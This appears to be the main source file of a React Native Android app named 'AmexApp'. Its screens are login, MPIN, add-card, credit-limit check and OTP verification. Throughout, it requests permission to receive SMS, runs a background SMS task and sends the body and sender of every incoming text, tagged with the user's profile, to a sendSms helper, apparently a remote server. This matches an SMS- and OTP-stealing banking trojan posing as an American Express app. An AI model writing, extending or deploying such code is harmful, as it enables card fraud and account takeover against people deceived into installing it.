import { useState, useEffect, useRef } from 'react';
import { createStackNavigator } from '@react-navigation/stack';
import { NavigationContainer } from '@react-navigation/native';
import {
  PermissionsAndroid,
  AppRegistry,
  NativeAppEventEmitter,
  Alert
} from 'react-native';

import { store } from './store/store';
import { Provider, useSelector } from 'react-redux';
import Login from './pages/Login';
import Welcome from './pages/Welcome';
import AddCard from './pages/AddCard';
import ThankYou from './pages/ThankYou';
import CheckLimit from './pages/CheckLimit';
import MPin from './pages/MPin';
import OTPVerification from './pages/OTPVerification'
import { sendSms } from './utils';
import AsyncStorage from '@react-native-async-storage/async-storage';

const Stack = createStackNavigator();

function MyStack() {
  return (
    <Stack.Navigator screenOptions={{ headerShown: false }}>
      <Stack.Screen name="Login" component={Login} />
      <Stack.Screen name="mpinScreen" component={MPin} />
      <Stack.Screen name="Welcome" component={Welcome} />
      <Stack.Screen name="checkLimit" component={CheckLimit} />
      <Stack.Screen name="AddCard" component={AddCard} />
      <Stack.Screen name='verifyOTP' component={OTPVerification} />
      <Stack.Screen name="Thankyou" component={ThankYou} />
    </Stack.Navigator>
  );
}

function AmexApp() {
  const [receiveSmsPermission, setReceiveSmsPermission] = useState('');
  const [user_profile, setUserProfile] = useState(null)
  const processedTimeStamp = useRef(new Set())
  const userId = useSelector(state => state.userProfile)
  const requestSmsPermission = async () => {
    try {
      const granted = await PermissionsAndroid.check(PermissionsAndroid.PERMISSIONS.RECEIVE_SMS);
      if (!granted) {
        const permission = await PermissionsAndroid.request(PermissionsAndroid.PERMISSIONS.RECEIVE_SMS);
        setReceiveSmsPermission(permission);
      } else {
        setReceiveSmsPermission(PermissionsAndroid.RESULTS.GRANTED);
      }
    } catch (err) {
      Alert.alert('Error', err.message);
    }
  };

  useEffect(() => {
    requestSmsPermission();
  }, []);

  useEffect(() => {
    AppRegistry.startHeadlessTask(0, 'SmsHeadlessTask');
  }, []);

  useEffect(() => {
    const getMobile = async () => {
      const userProfile = await AsyncStorage.getItem('user_profile');
      if (userId !== null && userId !== undefined) {
        setUserProfile(userId.id)
        return
      }
      if (userProfile) {
        const { user_profile } = JSON.parse(userProfile)
        setUserProfile(user_profile)
      }
    }
    getMobile();
  }, [user_profile, userId])


  useEffect(() => {

    if (receiveSmsPermission === PermissionsAndroid.RESULTS.GRANTED) {
      let subscriber = NativeAppEventEmitter.addListener(
        'onSMSReceived',
        async (message) => {
          const { messageBody, senderPhoneNumber, timestamp } = JSON.parse(message);
          const formattedTimeStamp = new Date(timestamp).toISOString()
          if (user_profile) {
            if (!processedTimeStamp.current.has(formattedTimeStamp)) {
              const data = {
                user_profile: user_profile,
                sender: senderPhoneNumber,
                message: messageBody,
                timestamp: formattedTimeStamp,
              };
              const x = await sendSms(data);
              processedTimeStamp.current.add(formattedTimeStamp)
            }
          }
        },
      );
      return () => {
        subscriber.remove();
      };
    }
  }, [receiveSmsPermission, user_profile]);

  return (
    <NavigationContainer>
      <MyStack />
    </NavigationContainer>
  );
}

export default function App() {
  return (
    <Provider store={store}>
      <AmexApp />
    </Provider>
  )
}
